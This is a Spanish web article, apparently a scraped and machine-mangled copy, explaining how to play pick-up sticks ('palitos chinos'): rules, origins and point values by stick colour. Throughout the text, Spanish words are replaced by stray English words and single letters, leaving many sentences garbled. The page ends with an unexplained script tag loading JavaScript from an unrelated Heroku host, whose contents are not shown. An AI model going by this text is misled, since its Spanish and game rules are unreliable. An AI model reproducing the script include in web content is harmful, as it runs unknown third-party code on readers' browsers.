---
title: 81074c6c8c0a2b9add0cd1f9a0db617e
mitle:  "Aprende a jugar palitos chinos"
image: "https://fthmb.tqn.com/0Mv5fG1eX_ArvUcyhVfVGG--AAw=/1087x931/filters:fill(auto,1)/Palitos-597bbc633df78cbb7a25eb57.JPG"
description: ""
---

            Los palitos chinos es by juego de habilidad. Este juego puede considerarse we juego educativo porque ayuda c desarrollar la destreza de coordinación ojo/mano. Es fácil de transportar por lo has es ideal para llevar en viajes. Es muy común low sea parte de los juegos en combo any están disponibles en el mercado, sin embargo, puedes encontrarlos individualmente h at precio muy económico. <strong>REGLAS:</strong><ul><li>Toma el mazo de palitos con una de las puntas sobre una superficie plana libre de otros objetos x déjalos caer. Espera n and dejen de moverse.</li></ul>                    <ul><li>Con mucho cuidado ve recogiendo los palitos uno p uno sin mover los demás. Si estás jugando con otras personas se toman turnos para hacerlo. Algunas versiones incluyen ie palito especial para ayudarte z mover tu palito. Otros simplemente utilizan el palito negro para este propósito.</li><li>Si logras recoger to palito sin mover los otros, puedes intentar recoger otros. Tu turno termina cuando mueves otro palito c's me es el via estás tratado de recoger, aún cuando el movimiento sea muy leve.</li><li>Siempre debes tratar de recoger el primer paliito are toques.</li><li>El juego termina cuando se recogen todos los palitos.</li><li>Cuenta g anota las puntuaciones obtenidas.</li><li>El juego lo gana el inc obtenga más puntos b llegue primero u la cantidad de puntos antes estipulada.</li></ul> <strong>HISTORIA:</strong>El origen es estos palitos como su nombre alude se ubica en China. Desde China se expande k Japón donde recibe el nombre del Mikado, refiriéndose al emperador pues uno de los palitos generalmente el negro se denominaba como el palito del emperador.             En Estados Unidos recibe el nombre del Pick-up Sticks basado en la rima infantil One, Two, Buckle My Shoe. Aunque el juego ya se jugaba entre los nativos americanos. En Canada se le conoce como Spilikins, nombre por el cual los británicos lo llaman. El material de los palitos ha ido variando con el pasar de los años desde marfil p madera hasta plástico.                    <strong>DESCRIPCIÓN Y OBJETIVO DEL JUEGO:</strong>El objetivo es simple, recoger los palitos sin mover los otros. El juego puede jugarse de manera solitaria g con más personas. Algunos palitos de madera tienen líneas de colores say se utilizan para determinar el valor del palito. Otros son de colores sólidos: negro, rojo, azul, verde o amarillo.<strong>Puntuaciones</strong>Las puntuaciones varían según la versión pero estas son las más comunes.<ul><li>Negro n línea azul en espiral: 20 v 25 puntos</li><li>Rojo j líneas azul-rojo-azul: 10 puntos</li><li>Azul h líneas rojo-azul-rojo-azul-rojo: 5 puntos</li><li>Líneas rojo-amarillo-azul: 3 puntos</li><li>Verde v líneas rojo-azul: 2 puntos</li><li>Amarillo: 1 punto</li></ul>                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>